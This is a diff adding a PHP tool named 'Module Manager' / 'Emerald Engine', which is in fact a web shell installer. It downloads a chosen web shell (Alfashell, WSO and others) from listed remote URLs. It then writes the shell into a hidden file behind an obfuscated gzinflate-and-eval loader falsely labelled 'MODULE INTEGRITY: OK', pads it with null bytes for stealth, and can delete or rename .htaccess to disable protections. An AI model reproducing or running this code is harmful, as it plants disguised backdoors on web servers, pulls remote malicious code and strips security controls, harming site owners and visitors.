@@ -1,0 +1,350 @@
+<?php
+/*
+ * MODULE MANAGER v3.5 (Ghost Split-Path Edition)
+ * Changelog:
+ * 1. UX Upgrade: Split Directory & Filename inputs.
+ * 2. Core: Retained Template Selector & Firewall Bypass.
+ * 3. UI: Premium Dark Theme with Smooth Animations.
+ */
+
+$msg = "";
+$msg_class = "";
+
+// --- PRESET TEMPLATES ---
+$templates = [
+    "" => "-- Select Module Template --",
+    "https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/ptsmc" => "Template 1: Alfashell",
+    "https://okepaste.cc/r/79e072b0" => "Template 2: Supershell",
+    "https://hushh.pro/a1/webshell/gelay.txt" => "Template 3: Gelayshell",
+    "https://okepaste.cc/r/19c86cf0" => "Template 4: Warasshell",
+    "https://okepaste.cc/r/a7a6accd" => "Template 5: Wsoshell"
+];
+
+// --- DOWNLOADER FUNCTION ---
+function getSource($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+        $res = curl_exec($ch);
+        curl_close($ch);
+        if($res) return $res;
+    }
+    return @file_get_contents($url);
+}
+
+// --- BUILDER LOGIC ---
+if (isset($_POST['build'])) {
+    $url        = trim($_POST['url']);
+    
+    // Ambil input terpisah
+    $dir_input  = rtrim(trim($_POST['dir_path']), '/\\'); // Hapus slash di akhir jika ada
+    $file_input = trim($_POST['filename']);
+    
+    // Gabungkan menjadi path lengkap
+    $path       = $dir_input . DIRECTORY_SEPARATOR . $file_input;
+    
+    $pad_kb     = intval($_POST['padding']); 
+    $bypass     = isset($_POST['bypass_htaccess']) ? true : false;
+
+    if ($url && $dir_input && $file_input) {
+        // Prepare Directory
+        if (!is_dir($dir_input)) { @mkdir($dir_input, 0755, true); }
+
+        // --- BYPASS LOGIC (.htaccess killer) ---
+        // Kita gunakan $dir_input langsung
+        $htaccess = $dir_input . DIRECTORY_SEPARATOR . ".htaccess";
+        $htaccess_bak = $dir_input . DIRECTORY_SEPARATOR . ".htaccess.bak";
+        $htaccess_touched = false;
+
+        if ($bypass && file_exists($htaccess)) {
+            if (@rename($htaccess, $htaccess_bak)) {
+                $htaccess_touched = true;
+            } else {
+                @chmod($htaccess, 0666);
+                @unlink($htaccess); 
+            }
+        }
+
+        // Download Source
+        $code = getSource($url);
+
+        if ($code) {
+            // 1. Raw Compression
+            $payload = gzdeflate($code, 9);
+            
+            // 2. Add Weight
+            if ($pad_kb > 0) {
+                $payload .= str_repeat("\0", $pad_kb * 1024); 
+            }
+
+            // 3. Script Header
+            $loader = '<?php
+// MODULE INTEGRITY: OK
+$h = fopen(__FILE__, "rb");
+fseek($h, __COMPILER_HALT_OFFSET__);
+eval("?>".gzinflate(stream_get_contents($h)));
+__halt_compiler();';
+
+            $final = $loader . $payload;
+
+            // Tulis file ke Path Gabungan
+            if (@file_put_contents($path, $final)) {
+                $size = number_format(filesize($path)/1024, 2);
+                
+                // Smart Path Display
+                $doc_root = $_SERVER['DOCUMENT_ROOT'];
+                $web_link = str_replace($doc_root, "", $path);
+                
+                // Fallback visual jika path diluar root
+                $display_loc = ($web_link == $path) ? basename($path) : $web_link;
+
+                $bypass_status = $htaccess_touched ? "<br><span style='color:#facc15; font-size:0.8em;'>(Firewall/Htaccess Disabled)</span>" : "";
+
+                $msg = "<h5>SYSTEM STATUS: SUCCESS</h5>
+                        <div class='info-grid'>
+                            <span>Target:</span> <code>$display_loc</code>
+                            <span>Size:</span> <code>$size KB (Stealth)</code>
+                        </div>
+                        <a href='$web_link' target='_blank' class='btn-link'>[ OPEN GENERATED FILE ]</a>
+                        $bypass_status";
+                $msg_class = "success";
+            } else {
+                $msg = "Write failed! Permission Denied.<br>Try checking the 'Force Mode' box.";
+                $msg_class = "error";
+            }
+        } else {
+            $msg = "Download failed. Check URL or Server Connection.";
+            $msg_class = "error";
+        }
+    } else {
+        $msg = "Input missing. Please check all fields.";
+        $msg_class = "error";
+    }
+}
+
+// Default values
+$current_dir = getcwd();
+$default_file = ".default.php";
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Emerald PTSMC</title>
+    <style>
+        /* CSS RESET & MODERN THEME */
+        :root {
+            --bg-color: #0f172a;
+            --panel-color: #1e293b;
+            --input-bg: #334155;
+            --text-main: #e2e8f0;
+            --text-muted: #94a3b8;
+            --accent: #ff0000; 
+            --accent-hover: #2563eb;
+            --success-border: #10b981;
+            --error-border: #ef4444;
+        }
+
+        body {
+            background-color: #220000;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            color: #ff0000;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* ANIMATIONS */
+        @keyframes fadeInScale {
+            0% { opacity: 0; transform: scale(0.95) translateY(20px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        @keyframes slideIn {
+            0% { opacity: 0; transform: translateY(-10px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        .container {
+            background: var(--panel-color);
+            width: 100%;
+            max-width: 500px;
+            padding: 2.5rem;
+            border-radius: 50px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6);
+            border: 1px solid #334155;
+            box-sizing: border-box;
+            animation: fadeInScale 0.8s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
+            opacity: 0;
+        }
+
+        /* HEADER */
+        .header { text-align: center; margin-bottom: 2rem; }
+        .header h1 { 
+            margin: 0; font-size: 2.6rem; font-weight: 700; color: #ff0000;
+        }
+        .header span { 
+            display: block; margin-top: 6px; font-size: 0.75rem; 
+            color: #ffffff; text-transform: uppercase; letter-spacing: 2px;
+        }
+
+        /* FORM */
+        .form-group { margin-bottom: 1.25rem; }
+        
+        label { 
+            display: block; margin-bottom: 0.6rem; font-size: 0.75rem; 
+            font-weight: 700; color: #ffffff; text-transform: uppercase;
+        }
+        
+        input[type="text"], select {
+            width: 100%;
+            padding: 14px 16px;
+            background-color: var(--bg-color);
+            border: 1px solid var(--input-bg);
+            border-radius: 17px;
+            color: #fff;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.9rem;
+            box-sizing: border-box;
+            transition: all 0.3s cubic-bezier(0, 0, 0.06, 0.98);
+        }
+        
+        input:focus, select:focus {
+            outline: none; border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
+        }
+
+        /* CHECKBOX */
+        .checkbox-group {
+            display: flex; align-items: center; margin-bottom: 1rem;
+            background: rgba(255,255,255,0.03); padding: 10px;
+            border-radius: 17px; border: 1px dashed #ef4444;
+        }
+        .checkbox-group input { margin-right: 10px; width: 18px; height: 18px; accent-color: #ef4444; }
+        .checkbox-group label { margin: 0; color: #fca5a5; cursor: pointer; text-transform: none; }
+
+        button {
+            width: 100%; padding: 16px; margin-top: 0.5rem;
+            background: linear-gradient(to right, #ff0000, #000000);
+            color: white; border: none; border-radius: 17px;
+            font-weight: 700; font-size: 0.95rem; cursor: pointer;
+            transition: all 0.3s cubic-bezier(0, 0, 0.06, 0.98); text-transform: uppercase; letter-spacing: 1px;
+        }
+        button:hover { filter: brightness(110%); transform: translateY(-3px); }
+
+        /* ALERT */
+        .alert {
+            padding: 1.5rem; border-radius: 17px; margin-bottom: 2rem;
+            font-size: 0.9rem; text-align: center; background: #0f172a;
+            border: 1px solid var(--input-bg); border-left: 4px solid;
+            animation: slideIn 0.5s ease-out forwards;
+        }
+        .success { border-left-color: var(--success-border); }
+        .error { border-left-color: var(--error-border); color: #fca5a5; }
+        .alert h5 { margin: 0 0 10px 0; color: var(--success-border); text-transform: uppercase; }
+
+        .info-grid {
+            display: grid; grid-template-columns: min-content 1fr;
+            gap: 8px 15px; text-align: left; margin-bottom: 20px;
+            font-size: 0.85rem; color: #ffffff;
+            background: rgba(255,255,255,0.03); padding: 10px; border-radius: 17px;
+        }
+        .info-grid code { color: #e2e8f0; word-break: break-all; }
+        
+        .btn-link {
+            display: inline-block; background: var(--input-bg);
+            color: white; text-decoration: none; padding: 12px 24px;
+            border-radius: 17px; font-weight: 600; font-size: 0.8rem;
+            border: 1px solid transparent; transition: all 0.2s;
+        }
+        .btn-link:hover { border-color: var(--success-border); color: var(--success-border); background: transparent; }
+
+        #custom-url-group { display: none; margin-top: 10px; animation: slideIn 0.3s ease; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <h1>Emerald Engine</h1>
+            <span>Created by PTSMC Group</span>
+        </div>
+
+        <?php if($msg): ?>
+            <div class="alert <?php echo $msg_class; ?>">
+                <?php echo $msg; ?>
+            </div>
+        <?php endif; ?>
+
+        <form method="POST">
+            
+            <div class="form-group">
+                <label>Select Template</label>
+                <select id="template-select" onchange="updateUrl()">
+                    <?php foreach($templates as $link => $name): ?>
+                        <option value="<?php echo $link; ?>"><?php echo $name; ?></option>
+                    <?php endforeach; ?>
+                    <option value="custom">-- Custom Raw URL --</option>
+                </select>
+                <div id="custom-url-group">
+                    <input type="text" name="url" id="url-input" placeholder="Enter RAW URL here...">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Installation Directory</label>
+                <input type="text" name="dir_path" value="<?php echo $current_dir; ?>" required>
+            </div>
+
+            <div class="form-group">
+                <label>Target Filename</label>
+                <input type="text" name="filename" value="<?php echo $default_file; ?>" placeholder="example.php" required>
+            </div>
+
+            <div class="form-group">
+                <label>Obfuscation Level</label>
+                <select name="padding">
+                    <option value="0">None (Smallest)</option>
+                    <option value="400" selected>Add 400 KB (Recommended)</option>
+                    <option value="1000">Add 1 MB</option>
+                </select>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" name="bypass_htaccess" id="bypass">
+                <label for="bypass">Force Mode (Disable .htaccess/Firewall)</label>
+            </div>
+
+            <button type="submit" name="build">Install</button>
+        </form>
+    </div>
+
+    <script>
+        function updateUrl() {
+            var select = document.getElementById('template-select');
+            var customGroup = document.getElementById('custom-url-group');
+            var input = document.getElementById('url-input');
+
+            if (select.value === 'custom') {
+                customGroup.style.display = 'block';
+                input.value = '';
+                input.focus();
+            } else {
+                customGroup.style.display = 'none';
+                input.value = select.value;
+            }
+        }
+        updateUrl();
+    </script>
+
+</body>
+</html>
